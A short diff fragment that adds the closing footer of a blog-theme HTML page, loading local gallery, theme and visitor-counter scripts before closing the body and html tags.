+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
